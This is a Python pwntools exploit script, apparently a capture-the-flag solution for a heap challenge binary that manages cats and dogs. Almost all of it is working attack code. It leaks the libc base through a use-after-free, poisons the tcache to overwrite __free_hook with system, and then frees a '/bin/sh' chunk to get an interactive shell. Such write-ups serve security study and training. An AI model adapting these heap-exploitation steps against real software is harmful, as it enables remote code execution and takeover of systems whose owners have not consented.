#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 1

filename = "./pwn"
if LOCAL:
    p = process(filename)
else:
    remote_service = ""
    remote_service = remote_service.strip().split(":")
    p = remote(remote_service[0], int(remote_service[1]))
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)


rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("p.pid")
        input()
    pass

def cmd(choice):
	ru(b'choice:\n')
	sl(i2b(choice))
def create(cat_dog, idx, age, name=b'a'*8):
	cmd(1)
	ru(b'cat or dog?\n')
	tmp = b'dog' if (cat_dog) else b'cat'
	sl(tmp)
	ru(b'index:\n')
	sl(i2b(idx))
	ru(b"name:\n")
	sl(name)
	ru(b"age:\n")
	sl(i2b(age))
def show(cat_dog, idx):
	cmd(2)
	ru(b'cat or dog?\n')
	tmp = b'dog' if (cat_dog) else b'cat'
	sl(tmp)
	ru(b'index:\n')
	sl(i2b(idx))
def manage_select(cat_dog, idx):
	cmd(3)
	cmd(1)
	ru(b'select cat or dog?\n')
	tmp = b'dog' if (cat_dog) else b'cat'
	sl(tmp)
	ru(b"index:\n")
	sl(i2b(idx))
	cmd(4)
def manage_add_age(cat_dog, delta):
	cmd(3)
	cmd(2)
	ru(b'select cat or dog?\n')
	tmp = b'dog' if (cat_dog) else b'cat'
	sl(tmp)
	ru(b'add\n')
	sl(i2b(delta))
	cmd(4)
def manage_name(cat_dog, new_name):
	cmd(3)
	cmd(3)
	ru(b'select cat or dog?\n')
	tmp = b'dog' if (cat_dog) else b'cat'
	sl(tmp)
	ru(b'name:\n')
	sl(new_name)
	cmd(4)

debugPID()


# -------leak-thorugh-UAF---------
## trying to get a unsortedbin chunk near nameptr
create(1, 0, 8, b"a"*0x420)
manage_select(1, 0)
create(1, 0, 8, b"a"*0x20)
create(0, 0, 8, b"a"*0x20)

manage_add_age(1, 0xc0)
show(0, 0)
ru(b"name:")
libc_base = uu64(rn(6)) - 0x1ecbe0
lg("libc_base")


# -------tcache-attack------------
create(1, 1, 8, b"a"*0x30)
manage_select(1, 1)
create(1, 1, 8, b"b"*0x30)
manage_name(1, p64(libc_base + l.symbols['__free_hook'] - 0x18).replace(b"\x00", b""))
create(1, 2, 8)
create(1, 3, 8, b"/bin/sh\x00".ljust(0x60, b"a"))
create(0, 4, 8, p64(libc_base + l.symbols['system']))
create(1, 3, 8)

irt()
